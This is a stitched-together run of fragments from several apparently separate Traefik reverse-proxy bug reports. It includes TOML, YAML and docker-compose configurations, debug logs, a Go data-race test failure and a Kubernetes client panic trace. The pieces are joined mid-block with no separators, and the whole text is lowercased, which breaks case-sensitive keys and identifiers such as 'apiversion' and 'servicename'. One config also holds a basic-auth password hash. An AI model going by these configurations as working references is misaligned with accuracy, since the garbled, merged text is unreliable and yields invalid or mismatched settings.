[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] compress = true address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/traefik/selfsigned.crt" keyfile = "/etc/traefik/selfsigned.key" [traefiklog] [accesslog] [web]
address = ":8080" [docker]
domain = "docker.localhost"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
attaching to traefikredirecthttp2compression_proxy_1, traefikredirecthttp2compression_redirectwebapp_1
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="traefik version v1.4.1 built on 2017-10-24_05:25:28pm"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","accesslog":{"format":"common"},"traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":{"entrypoint":"https","regex":"","replacement":""},"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"network":"","address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":[{"certfile":"/etc/traefik/selfsigned.crt","keyfile":"/etc/traefik/selfsigned.key"}],"clientcafiles":null},"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":true,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"docker":{"watch":true,"filename":"","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"docker.localhost","tls":null,"exposedbydefault":true,"usebindportip":false,"swarmmode":false},"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"/","auth":null,"debug":false,"currentconfigurations":null,"stats":null,"statsrecorder":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="starting provider *docker.provider {"watch":true,"filename":"","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"docker.localhost","tls":null,"exposedbydefault":true,"usebindportip":false,"swarmmode":false}"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="starting server on :443"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="starting provider *web.provider {"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"/","auth":null,"debug":true,"currentconfigurations":{},"stats":{"uptime":"2017-11-02t06:40:45.776601213z","pid":1,"responsecounts":{},"totalresponsecounts":{},"totalresponsetime":"0001-01-01t00:00:00z"},"statsrecorder":null}"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="starting server on :80"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="provider connection established with docker 17.09.0-ce (api 1.32)"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="validation of load balancer method for backend backend-proxy-traefikredirecthttp2compression failed: invalid load-balancing method \'\'
using default method wrr."
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="configuration received from provider docker: {"backends":{"backend-proxy-traefikredirecthttp2compression":{"servers":{"server-traefikredirecthttp2compression_proxy_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-proxy-traefikredirecthttp2compression-docker-localhost":{"entrypoints":["http","https"],"backend":"backend-proxy-traefikredirecthttp2compression","routes":{"route-frontend-host-proxy-traefikredirecthttp2compression-docker-localhost":{"rule":"host:proxy.traefikredirecthttp2compression.docker.localhost"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}}}}"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="last docker config received more than 2s, ok"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating frontend frontend-host-proxy-traefikredirecthttp2compression-docker-localhost"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="wiring frontend frontend-host-proxy-traefikredirecthttp2compression-docker-localhost to entrypoint http"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating route route-frontend-host-proxy-traefikredirecthttp2compression-docker-localhost host:proxy.traefikredirecthttp2compression.docker.localhost"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating entrypoint redirect http -> https : ^(?:https?:\\/\\/)?([\\w\\._-]+)(?::\\d+)?(.*)$ -> "
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating backend backend-proxy-traefikredirecthttp2compression"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating load-balancer wrr"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating server server-traefikredirecthttp2compression_proxy_1 at with weight 0"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="wiring frontend frontend-host-proxy-traefikredirecthttp2compression-docker-localhost to entrypoint https"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating route route-frontend-host-proxy-traefikredirecthttp2compression-docker-localhost host:proxy.traefikredirecthttp2compression.docker.localhost"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating backend backend-proxy-traefikredirecthttp2compression"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating load-balancer wrr"
proxy_1 | time="2017-11-02t06:40:45z" level=debug msg="creating server server-traefikredirecthttp2compression_proxy_1 at with weight 0"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="server configuration reloaded on :443"
proxy_1 | time="2017-11-02t06:40:45z" level=info msg="server configuration reloaded on :80"
proxy_1 | time="2017-11-02t06:40:46z" level=debug msg="provider event received {status:start id:c63e8d74c02a364f74191b08bfc68a23ee0ca69d6ceb871464f9627fec1814de from:redirectwebapp type:container action:start actor:{id:c63e8d74c02a364f74191b08bfc68a23ee0ca69d6ceb871464f9627fec1814de attributes:map[com.docker.compose.container-number:1 image:redirectwebapp name:traefikredirecthttp2compression_redirectwebapp_1 traefik.frontend.rule:host:redirectwebapp.docker.localhost com.docker.compose.config-hash:28964e0e6349fd74892156ecb1a37c9f2cf1bb8f725edbb48464bf1445a7185b com.docker.compose.project:traefikredirecthttp2compression com.docker.compose.service:redirectwebapp com.docker.compose.version:1.16.1 traefik.backend:redirectwebapp com.docker.compose.oneoff:false]} scope:local time:1509604846 timenano:1509604846641687040}"
proxy_1 | time="2017-11-02t06:40:46z" level=debug msg="validation of load balancer method for backend backend-redirectwebapp failed: invalid load-balancing method \'\'
using default method wrr."
proxy_1 | time="2017-11-02t06:40:46z" level=debug msg="validation of load balancer method for backend backend-proxy-traefikredirecthttp2compression failed: invalid load-balancing method \'\'
using default method wrr."
proxy_1 | time="2017-11-02t06:40:46z" level=debug msg="configuration received from provider docker: {"backends":{"backend-proxy-traefikredirecthttp2compression":{"servers":{"server-traefikredirecthttp2compression_proxy_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}},"backend-redirectwebapp":{"servers":{"server-traefikredirecthttp2compression_redirectwebapp_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-proxy-traefikredirecthttp2compression-docker-localhost":{"entrypoints":["http","https"],"backend":"backend-proxy-traefikredirecthttp2compression","routes":{"route-frontend-host-proxy-traefikredirecthttp2compression-docker-localhost":{"rule":"host:proxy.traefikredirecthttp2compression.docker.localhost"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}},"frontend-host-redirectwebapp-docker-localhost":{"entrypoints":["http","https"],"backend":"backend-redirectwebapp","routes":{"route-frontend-host-redirectwebapp-docker-localhost":{"rule":"host:redirectwebapp.docker.localhost"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}}}}"
proxy_1 | time="2017-11-02t06:40:46z" level=debug msg="last docker config received less than %!s(flaeg.duration=2000000000), waiting..."
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="waited for docker config, ok"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating frontend frontend-host-proxy-traefikredirecthttp2compression-docker-localhost"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="wiring frontend frontend-host-proxy-traefikredirecthttp2compression-docker-localhost to entrypoint http"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating route route-frontend-host-proxy-traefikredirecthttp2compression-docker-localhost host:proxy.traefikredirecthttp2compression.docker.localhost"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating entrypoint redirect http -> https : ^(?:https?:\\/\\/)?([\\w\\._-]+)(?::\\d+)?(.*)$ -> "
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating backend backend-proxy-traefikredirecthttp2compression"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating load-balancer wrr"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating server server-traefikredirecthttp2compression_proxy_1 at with weight 0"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="wiring frontend frontend-host-proxy-traefikredirecthttp2compression-docker-localhost to entrypoint https"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating route route-frontend-host-proxy-traefikredirecthttp2compression-docker-localhost host:proxy.traefikredirecthttp2compression.docker.localhost"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating backend backend-proxy-traefikredirecthttp2compression"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating load-balancer wrr"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating server server-traefikredirecthttp2compression_proxy_1 at with weight 0"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating frontend frontend-host-redirectwebapp-docker-localhost"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="wiring frontend frontend-host-redirectwebapp-docker-localhost to entrypoint http"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating route route-frontend-host-redirectwebapp-docker-localhost host:redirectwebapp.docker.localhost"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating backend backend-redirectwebapp"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating load-balancer wrr"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating server server-traefikredirecthttp2compression_redirectwebapp_1 at with weight 0"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="wiring frontend frontend-host-redirectwebapp-docker-localhost to entrypoint https"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating route route-frontend-host-redirectwebapp-docker-localhost host:redirectwebapp.docker.localhost"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating backend backend-redirectwebapp"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating load-balancer wrr"
proxy_1 | time="2017-11-02t06:40:48z" level=debug msg="creating server server-traefikredirecthttp2compression_redirectwebapp_1 at with weight 0"
proxy_1 | time="2017-11-02t06:40:48z" level=info msg="server configuration reloaded on :443"
proxy_1 | time="2017-11-02t06:40:48z" level=info msg="server configuration reloaded on :80"
proxy_1 | time="2017-11-02t06:41:00z" level=debug msg="round trip: code: 302, duration: 4.199673ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:localhost"
proxy_1 | 172.22.0.1 - - [02/nov/2017:06:41:00 +0000] "get /redirect http/2.0" 302 109 - "curl/7.56.1" 1 "host-redirectwebapp-docker-localhost" " " 4ms
```toml [file] [frontends] [frontends.website-a] priority = 10 backend = "app" basicauth = ["aaa:aaa"] [frontends.website-a.routes.a] rule = "pathprefix: /secure" [frontends.website-b] priority = 5 backend = "app" [frontends.website-b.routes.b] rule = "pathprefix: /hello" [backends] [backends.app] [backends.app.servers.app] url = " "
```yaml traefik: image: traefik:1.4 command: |- --loglevel=warn --entrypoints='name:http address::80 redirect.entrypoint:https' --entrypoints='name:https address::443 tls' --docker --docker.swarmmode --docker.exposedbydefault=false --acme --acme.entrypoint=https --acme.email= --acme.storage=/acme/acme.json --acme.ondemand=false --acme.onhostrule=true environment: - gomaxprocs=4 ports: - target: 80 published: 80 protocol: tcp mode: host - target: 443 published: 443 protocol: tcp mode: host volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - /dev/null:/traefik.toml - acme:/acme networks: - overlay - private deploy: placement: constraints: - node.role == manager
- operating system: rhel atomic host v7.4.0
- docker engine: v1.13.1-21.1.gitcd75c68.el7
- orchestration: docker swarm mode
`$ cat /etc/traefik/traefik.toml`
checknewversion = false
traefiklogsfile = "/var/log/traefik/traefik.log"
loglevel = "info"
insecureskipverify = true
rootcas = [ "/etc/ssl/ca.crt" ]
defaultentrypoints = ["http","https"] [accesslog] filepath = "/var/log/traefik/access.log" format = "json" [retry] attempts = 3 [healthcheck] interval = "30s" [web] address = ":8080" certfile = "/etc/ssl/wildcard.crt" keyfile = "/etc/ssl/wildcard.key" [web.auth.basic] users = ["username:$apr1$awbzvi2u$0tx%3idelob/hj4xd9u0h1"] [web.statistics] recenterrors = 10 [web.metrics] [web.metrics.prometheus] buckets=[0.1,0.3,1.2,5.0] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/wildcard.crt" keyfile = "/etc/ssl/wildcard.key" [docker] endpoint = "tcp://master01.example.com:2376" watch = true domain = "example.com" swarmmode = true usebindportip = true exposedbydefault = true [docker.tls] ca = "/etc/ssl/docker/ca.pem" cert = "/etc/ssl/docker/client-cert.pem" key = "/etc/ssl/docker/client-key.pem"
n/a ### if applicable, please paste the log output in debug mode (`--debug` switch) ```console
> go test -race -cover -coverprofile=cover.out ./provider/file
time="2017-10-19t18:49:45z" level=error msg="error occurred during watcher callback: error reading configuration file: open /tmp/testfile542498938/simple.toml: no such file or directory" ==================
warning: data race
read at by goroutine 14: github.com/containous/traefik/provider/file.createconfigurationroutine.func1() /go/src/github.com/containous/traefik/provider/file/file_test.go:155 + github.com/containous/traefik/safe.gowithrecover.func1() /go/src/github.com/containous/traefik/safe/routine.go:142 + previous write at by goroutine 13: github.com/containous/traefik/provider/file.testprovidedirectoryandwatch() /go/src/github.com/containous/traefik/provider/file/file_test.go:104 + testing.trunner() /usr/local/go/src/testing/testing.go:746 + goroutine 14 (running) created at: github.com/containous/traefik/safe.gowithrecover() /go/src/github.com/containous/traefik/safe/routine.go:136 + github.com/containous/traefik/safe.go() /go/src/github.com/containous/traefik/safe/routine.go:131 + github.com/containous/traefik/provider/file.createconfigurationroutine() /go/src/github.com/containous/traefik/provider/file/file_test.go:151 + github.com/containous/traefik/provider/file.testprovidedirectoryandwatch() /go/src/github.com/containous/traefik/provider/file/file_test.go:95 + testing.trunner() /usr/local/go/src/testing/testing.go:746 + goroutine 13 (running) created at: testing.(*t).run() /usr/local/go/src/testing/testing.go:789 + testing.runtests.func1() /usr/local/go/src/testing/testing.go:1004 + testing.trunner() /usr/local/go/src/testing/testing.go:746 + testing.runtests() /usr/local/go/src/testing/testing.go:1002 + testing.(*m).run() /usr/local/go/src/testing/testing.go:921 + main.main() github.com/containous/traefik/provider/file/_test/_testmain.go:96 +
==================
==================
warning: data race
read at by goroutine 14: github.com/containous/traefik/provider/file.createconfigurationroutine.func1() /go/src/github.com/containous/traefik/provider/file/file_test.go:156 + github.com/containous/traefik/safe.gowithrecover.func1() /go/src/github.com/containous/traefik/safe/routine.go:142 + previous write at by goroutine 13: github.com/containous/traefik/provider/file.testprovidedirectoryandwatch() /go/src/github.com/containous/traefik/provider/file/file_test.go:105 + testing.trunner() /usr/local/go/src/testing/testing.go:746 + goroutine 14 (running) created at: github.com/containous/traefik/safe.gowithrecover() /go/src/github.com/containous/traefik/safe/routine.go:136 + github.com/containous/traefik/safe.go() /go/src/github.com/containous/traefik/safe/routine.go:131 + github.com/containous/traefik/provider/file.createconfigurationroutine() /go/src/github.com/containous/traefik/provider/file/file_test.go:151 + github.com/containous/traefik/provider/file.testprovidedirectoryandwatch() /go/src/github.com/containous/traefik/provider/file/file_test.go:95 + testing.trunner() /usr/local/go/src/testing/testing.go:746 + goroutine 13 (running) created at: testing.(*t).run() /usr/local/go/src/testing/testing.go:789 + testing.runtests.func1() /usr/local/go/src/testing/testing.go:1004 + testing.trunner() /usr/local/go/src/testing/testing.go:746 + testing.runtests() /usr/local/go/src/testing/testing.go:1002 + testing.(*m).run() /usr/local/go/src/testing/testing.go:921 + main.main() github.com/containous/traefik/provider/file/_test/_testmain.go:96 +
==================
--- fail: testprovidedirectoryandwatch (0.01s) testing.go:699: race detected during execution of test
time="2017-10-19t18:49:47z" level=error msg="error occurred during watcher callback: unable to read directory /tmp/testdir371695036: open /tmp/testdir371695036: no such file or directory" fail ```
my traefik configuration is the following one (i only have changed `tlsacme` to `tls` when bumping version) ```yaml traefik: image: traefik:roquefort command: - --loglevel=debug - --web - --web.metrics - --web.metrics.prometheus - --web.readonly - --web.statistics - --insecureskipverify - --acme - --acme.ondemand - --acme.email=xxx@vibioh.fr - --acme.storage=/etc/traefik/acme/acme.json - --acme.domains=vibioh.fr - --acme.entrypoint=https - --defaultentrypoints=https,http - --entrypoints=name:https address::443 tls - --entrypoints=name:http address::80 redirect.entrypoint:https - --docker
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-10-19t11:34:41z" level=debug msg="look for provided certificate to validate [api-tls.vibioh.fr]..." time="2017-10-19t11:34:41z" level=debug msg="no provided certificate found for domains [api-tls.vibioh.fr], get acme certificate." time="2017-10-19t11:34:41z" level=debug msg="challenge getcertificate api-tls.vibioh.fr" time="2017-10-19t11:34:41z" level=debug msg="acme got domain cert api-tls.vibioh.fr" time="2017-10-19t11:34:41z" level=debug msg="round trip: code: 200, duration: 1.261138ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:api-tls.vibioh.fr" time="2017-10-19t11:34:49z" level=debug msg="look for provided certificate to validate [api-tls.vibioh.fr]..." time="2017-10-19t11:34:49z" level=debug msg="no provided certificate found for domains [api-tls.vibioh.fr], get acme certificate." time="2017-10-19t11:34:49z" level=debug msg="challenge getcertificate api-tls.vibioh.fr" time="2017-10-19t11:34:49z" level=debug msg="acme got domain cert api-tls.vibioh.fr"
domain = "dev.rz"
watch = true
refreshseconds = 15
exposedbydefault = false
enableservicehealthfilter = false/true (!!!) [rancher.metadata]
intervalpoll = false
prefix = "/latest"
{ "gracetimeout": 10000000000, "debug": false, "checknewversion": true, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "loglevel": "error", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "docker": null, "file": null, "web": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": ""
```docker-compose
version: "3"
services: traefik: image: traefik:1.4.0-alpine command: # - --debug - --loglevel=info - --checknewversion=true - --insecureskipverify=true - --web - --web.path=/traefik - --web.address=:8080 - --web.readonly - --web.statistics - --defaultentrypoints=http,https - "--entrypoints=name:http address::80 proxyprotocol:true compress:true redirect.entrypoint:https" - "--entrypoints=name:https address::443 tls compress:true proxyprotocol:true" - --docker - --docker.watch - --docker.exposedbydefault=false - --docker.swarmmode ports: - 80:80 - 443:443 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - traefik:/data deploy: restart_policy: condition: on-failure delay: 5s max_attempts: 2 update_config: delay: 5s failure_action: rollback monitor: 10s labels: - "traefik.enable=true" - "traefik.docker.network=org_traefik" - "traefik.port=8080" - "traefik.protocol=http" - "traefik.frontend.rule=pathprefix:/traefik"
volumes: traefik:
networks: traefik: ### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
provider: docker
everything else mostly defaults.
rootcas = [ "cert.pem" ] [file] [entrypoints] [entrypoints.https] address = ":8888" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "cert.pem" keyfile = "key.pem" [frontends] [frontends.frontend1] entrypoints = ["https"] backend = "backend1" [backends] [backends.backend1] [backends.backend1.servers.server1] url = " " weight = 10
### if applicable, please paste the log output in debug mode (`--debug` switch) there is no relevant output
```toml ```
deployed via helm, with fairly standard config: ingress configuration looks like this: ```yml
apiversion: extensions/v1beta1
kind: ingress
metadata: name: kube-dashboard namespace: kube-system annotations: kubernetes.io/ingress.class: "traefik" ingress.kubernetes.io/auth-type: basic ingress.kubernetes.io/auth-realm: "authenticate" # problematic line ingress.kubernetes.io/auth-secret: admin-htpasswd
spec: rules: - host: dashboard.my.cluster http: paths: - path: / backend: servicename: kubernetes-dashboard serviceport: 80
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-10-10t10:24:56z" level=info msg="traefik version v1.3.8 built on 2017-09-07_08:46:19pm" time="2017-10-10t10:24:56z" level=info msg="using toml configuration file /config/traefik.toml" time="2017-10-10t10:24:56z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> compress:true}" time="2017-10-10t10:25:00z" level=info msg="loading acme account..." time="2017-10-10t10:25:00z" level=info msg="loaded acme config from store /acme/acme.json" time="2017-10-10t10:25:01z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> compress:true}" time="2017-10-10t10:25:01z" level=info msg="starting provider *server.webprovider {"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":{"basic":{"users":["admin:<redacted>"],"usersfile":""},"digest":null,"headerfield":""}}" time="2017-10-10t10:25:01z" level=info msg="starting provider *kubernetes.provider {"watch":true,"filename":"","constraints":[],"endpoint":"","token":"","certauthfilepath":"","disablepasshostheaders":false,"namespaces":null,"labelselector":""}" time="2017-10-10t10:25:01z" level=info msg="retrieving acme certificates..." time="2017-10-10t10:25:01z" level=info msg="retrieved acme certificates" time="2017-10-10t10:25:01z" level=info msg="starting server on :443" time="2017-10-10t10:25:01z" level=info msg="starting server on :80" time="2017-10-10t10:25:01z" level=info msg="creating in-cluster provider client
" time="2017-10-10t10:25:02z" level=error msg="provider connection error: no realm customization supported; retrying in 267.639422ms" error: logging before flag.parse: e1010 10:25:02.235691 1 runtime.go:66] observed a panic: "send on closed channel" (send on closed channel)
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:72
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:65
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:51
/usr/local/go/src/runtime/asm_amd64.s:514
/usr/local/go/src/runtime/panic.go:489
/usr/local/go/src/runtime/chan.go:180
/usr/local/go/src/runtime/chan.go:604
/go/src/github.com/containous/traefik/provider/kubernetes/client.go:136
/go/src/github.com/containous/traefik/provider/kubernetes/client.go:143
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:173
<autogenerated>:50
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:251
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:420
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:131
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:96
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:97
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:52
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102
/usr/local/go/src/runtime/asm_amd64.s:2197
error: logging before flag.parse: e1010 10:25:02.235872 1 runtime.go:66] observed a panic: "send on closed channel" (send on closed channel)
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:72
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:65
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:51
/usr/local/go/src/runtime/asm_amd64.s:514
/usr/local/go/src/runtime/panic.go:489
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:58
/usr/local/go/src/runtime/asm_amd64.s:514
/usr/local/go/src/runtime/panic.go:489
/usr/local/go/src/runtime/chan.go:180
/usr/local/go/src/runtime/chan.go:604
{ "gracetimeout": 10000000000, "debug": true, "checknewversion": true, "accesslogsfile": "/var/log/traefik/access.log", "accesslog": null, "traefiklogsfile": "/var/log/traefik/traefik.log", "loglevel": "debug", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "docker": null, "file": null, "web": null, "marathon": null, "consul": null, "consulcatalog": { "watch": false, "filename": "", "constraints": [], "trace": false, "debugloggeneratedtemplate": false, "endpoint": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domain": "service.consul", "exposedbydefault": true, "prefix": "traefik", "frontendrule": "host:{{servicename}}.{{domain}},pathprefixstrip:/{{servicename}}" }, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": "/etc/traefik/traefik.toml"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-10-04t06:02:44z" level=info msg="traefik version v1.4.0-rc4 built on 2017-10-02_02:19:32pm" time="2017-10-04t06:02:44z" level=debug msg="global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"/var/log/traefik/access.log","accesslog":null,"traefiklogsfile":"/var/log/traefik/traefik.log","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"docker":null,"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null,"debug":false,"currentconfigurations":null,"stats":null,"statsrecorder":null},"marathon":null,"consul":null,"consulcatalog":{"watch":false,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"endpoint":"127.0.0.1:8500","domain":"service.consul","exposedbydefault":true,"prefix":"traefik","frontendrule":"host:{{servicename}}.{{domain}},pathprefixstrip:/{{servicename}}"},"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}" time="2017-10-04t06:02:44z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:false} with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2017-10-04t06:02:44z" level=info msg="starting provider *web.provider {"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null,"debug":true,"currentconfigurations":{},"stats":{"uptime":"2017-10-04t06:02:44.192885209z","pid":1442,"responsecounts":{},"totalresponsecounts":{},"totalresponsetime":"0001-01-01t00:00:00z"},"statsrecorder":null}" time="2017-10-04t06:02:44z" level=info msg="starting provider *consul.catalogprovider {"watch":false,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"endpoint":"127.0.0.1:8500","domain":"service.consul","exposedbydefault":true,"prefix":"traefik","frontendrule":"host:{{servicename}}.{{domain}},pathprefixstrip:/{{servicename}}"}" time="2017-10-04t06:02:44z" level=info msg="starting server on :80" time="2017-10-04t06:02:44z" level=error msg="failed to retrieve health checks" error="unexpected response code: 500 (no known consul servers)" time="2017-10-04t06:02:44z" level=error msg="failed to list services: unexpected response code: 500 (no known consul servers)" ```
docker cloud with overlay network ```toml
# unrelated entries removed
loglevel = "debug"
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [backends] [backends.streaming-api-backend-dev] [backends.streaming-api-backend-dev.servers.server1] url = "ws://streaming-api.backend-dev:7788" [frontends] [frontends.streaming-api-dev] backend = "streaming-api-backend-dev" [frontends.streaming-api-dev.routes.test_1] rule = "host:streaming.example.com"
